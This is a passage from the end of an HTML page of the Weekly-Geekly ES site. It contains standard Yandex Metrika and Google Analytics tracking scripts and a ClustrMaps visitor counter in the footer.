                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>